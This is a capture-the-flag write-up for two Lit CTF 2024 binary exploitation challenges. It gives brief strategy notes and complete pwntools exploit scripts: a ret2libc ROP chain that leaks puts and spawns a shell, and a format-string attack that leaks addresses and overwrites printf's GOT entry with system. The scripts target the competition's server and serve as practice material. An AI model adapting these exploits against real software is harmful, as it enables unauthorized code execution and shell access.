# Lit CTF 2024

## pwn-Function Pairing
### strategy-1
* puts(puts)->libc leak and return to main
* rop with libc rop gadget
```python
from pwn import *

e = ELF("vuln")
libc = ELF("/usr/lib/x86_64-linux-gnu/libc.so.6")

context.binary = e
#p = e.process()
p = remote("litctf.org",31774)

print(p.recv().decode())

ret = p64(0x000000000040101a)
pop_rdi_ret = p64(0x0000000000401293)
offest = 264

payload = b"A" * offest
payload += ret
payload += pop_rdi_ret
payload += p64(e.got['puts'])
payload += p64(e.plt['puts'])
payload += p64(e.sym['main'])

p.sendline(payload)
print(p.recv().decode())

p.sendline(b"0")
print(p.recvuntil(b"0\n").decode())
puts = u64(p.recvline().strip() + b'\x00\x00')
print(f"puts @ {hex(puts)}")

libc.address = puts - libc.sym["puts"]
rop = ROP(libc,base=libc.address)
rop.call(rop.ret)
rop.system(next(libc.search(b"/bin/sh")),0,0)
print(p.recv().decode())
p.sendline(b"A"*offest + rop.chain())
print(p.recv())
p.sendline(b"0")

p.interactive()
```

## pwn-Infinite Echo
### strategy-2
* format string vulnerability
* binary base leak
* libc leak
* got overwrite printf->system
* printf("/bin/sh") -> system("/bin/sh")
```python
from pwn import *

e = ELF("main")
libc = ELF("libc-2.31.so")
context.binary = e
#local
#libc = ELF("/usr/lib/x86_64-linux-gnu/libc.so.6")
#p = e.process()
p = remote("litctf.org", 31772)

buf = 6

payload1 = b"%3$lx" #read+18

print(p.recvline().decode())
p.sendline(payload1)
addr = int(p.recvline().decode().strip(),16)
print(f"read +18 @ {hex(addr)}")
base = addr - 18 - libc.sym['read']
libc.address = base

payload2 = b"%28$lx"
p.sendline(payload2)
addr = int(p.recvline().decode().strip(),16)
print(f"base +0x40 @ {hex(addr)}")
binbase = addr - 0x40
e.address = binbase

payload3 = fmtstr_payload(buf, {e.got['printf'] : libc.sym['system']})

p.sendline(payload3)

p.sendline(b"/bin/sh")
p.interactive()
```